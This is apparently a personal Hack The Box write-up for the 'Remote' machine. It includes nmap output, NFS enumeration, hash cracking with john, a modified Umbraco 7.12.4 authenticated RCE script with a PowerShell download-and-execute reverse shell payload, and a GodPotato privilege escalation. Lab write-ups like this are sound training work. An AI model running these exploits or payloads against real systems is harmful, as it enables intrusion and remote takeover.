+++
title = "HTB - Remote"
date = 2024-12-15
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.10.180
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 16:47 EST
Nmap scan report for 10.10.10.180
Host is up (0.12s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-15T21:49:08
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.04 seconds

```

### Enumeration
21:
	Empty share.
80:
	Website with Umbraco portal. Umbraco is a content management system (CMS)
	Authentication required. Pull from NFS Mount as shown below.
	Once we have credentials, we find version to be 7.12.4. Authenticated RCE available.
	Use the `46153.py` available from `searchsploit`, and modify as below. Reference changes in the payload and parameters.
	After that, move a `nishang` shell to the working directory, add the one-line to the end, start a python instance on 8888, and then a listener on 9001. This process will take three windows. Once to run the python exploit, which will call to the python instance and download the `shell.ps1`, and the final window will be a `netcat` listener that catches the reverse shell started by the `nishang` one.
	
```python
	# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Dork: N/A
# Date: 2019-01-13
# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# CVE: N/A


import requests;

from bs4 import BeautifulSoup;

def print_dict(dico):
    print(dico.items());
    
print("Start");

# Execute a calc for the PoC
payload = '''<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "-c iex(new-object net.webclient).downloadstring('http://10.10.14.13:8888/shell.ps1')";\
 System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ''';

login = "admin@htb.local";
password="baconandcheese";
host = "http://10.10.10.180";

# Step 1 - Get Main page
s = requests.session()
url_main =host+"/umbraco/";
r1 = s.get(url_main);
print_dict(r1.cookies);

# Step 2 - Process Login
url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
loginfo = {"username":login,"password":password};
r2 = s.post(url_login,json=loginfo);

# Step 3 - Go to vulnerable web page
url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
r3 = s.get(url_xslt);

soup = BeautifulSoup(r3.text, 'html.parser');
VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

# Step 4 - Launch the attack
r4 = s.post(url_xslt,data=data,headers=headers);

print("End");
            
```

111:
	RPCBind open, no tool?
135/139:
	RPCClient Logon Failure
445:
	SMB Logon Failure
2049:
	Network File System (NFS). Super uncommon on HTB. 
	We can enumerate with `showmount -e 10.10.10.180`. We find a backup path.
	Mount with `mount -t nfs 10.10.10.180:/site_backups /mnt/`
	Rooting around a bit, `Umbraco.sdf` file sits in the `/App_Data` directory. These types of files are database files.
	Tried to `cat` out file, got jibberish. `strings Umbraco.sdf | head` cleans it up nicely.
	We find two users and hashes:
	`admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa` (SHA1)
	`ssmith@htb.local:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts=` (HMACSHA256)
	We can crack with `john`: 
	`john --wordlist=/usr/share/wordlists/rockyou.txt admin.sha1`. Password comes out to `baconandcheese`
	Logon with email and password.
	
5985:
	Suggests potential opportunity for `evil-winrm` later on.
USER:`ea7b9901723ffa87ccc127f13154f0d2`

### Privilege Escalation
`whoami /priv` shows we've got impersonate privileges. Juicy Potato?
Doesn't work. According to 0xdf, this was patched with 2019 Windows Server version. Ran `systeminfo` beforehand and had a hunch.
God Potato? Transfer with certutil: `certutil -urlcache -f http://10.10.14.13:8888/GodPotato.exe gp.exe`
Grab the flag: `.\gp.exe -cmd "cmd /c more \Users\Administrator\Desktop\root.txt"`
Could've gotten a shell as well. Update `nishang` to listen on `9002`, start a listener for the higher privilege shell, then run the following: `.\gp.exe -cmd "cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.13:8888/shell.ps1')"`
ROOT:`af3461e456df2e2604252b32cdb7574f`